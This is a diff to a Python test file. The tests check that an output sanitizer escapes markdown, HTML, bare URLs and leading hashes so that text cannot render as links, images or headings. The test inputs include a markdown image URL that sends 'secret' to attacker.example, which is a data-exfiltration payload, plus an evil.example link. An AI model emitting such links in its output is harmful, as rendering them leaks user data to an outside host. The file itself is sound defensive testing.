@@ -60,4 +60,12 @@ def test_tc_out_001_text_cannot_render_links_images_or_html():
     escaped = clean(hostile)
     for char in "[]<>*":
         assert re.search(rf"(?<!\\){re.escape(char)}", escaped) is None, f"unescaped {char!r} in {escaped}"
-    assert escaped.startswith("See !\\[x\\](https://attacker.example/?d=secret)")
+    assert escaped.startswith("See !\\[x\\](https\\://attacker.example/?d=secret)")
+
+
+def test_tc_out_001_bare_urls_and_leading_hashes_stay_text():
+    """Codex Stage 3 review S3-5: renderers auto-link bare URLs; a leading # makes a heading."""
+    escaped = clean("Visit https://attacker.example/?d=secret or www.evil.example now")
+    assert "https://" not in escaped and "https\\://attacker.example" in escaped
+    assert "www.evil" not in escaped and "www\\.evil.example" in escaped
+    assert clean("# Not a heading").startswith("\\# Not a heading")
